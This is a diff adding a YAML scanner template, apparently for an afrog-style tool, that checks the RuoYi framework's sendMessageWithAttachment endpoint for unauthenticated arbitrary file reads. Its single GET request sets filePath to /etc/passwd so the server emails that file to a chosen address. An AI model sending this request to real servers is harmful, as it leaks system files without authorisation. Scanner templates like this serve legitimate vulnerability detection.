@@ -1,0 +1,25 @@
+id: ruoyi-sendmessagewithattachment-fileread
+
+info:
+  name: 若依 sendMessageWithAttachment 接口文件读取漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    若依(RuoYi)框架 sendMessageWithAttachment 接口存在任意文件读取漏洞。未经身份验证的攻击者可通过该漏洞读取服务器敏感文件，导致系统信息泄露，造成严重安全风险。
+    注意：邮箱收到的邮件内容中包含文件路径，攻击者可通过该漏洞读取服务器敏感文件。
+  tags: ruoyi,fileread
+  created: 2026/01/09
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /demo/mail/sendMessageWithAttachment?to=yourQQ@qq.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd
+    expression: |
+      response.status == 200 &&
+      response.headers['content-type'].icontains("application/json") &&
+      response.body.bcontains(b'"code":200') &&
+      response.body.bcontains(b'"msg":"操作成功"') &&
+      response.body.bcontains(b'"data":"')
+expression: r0()
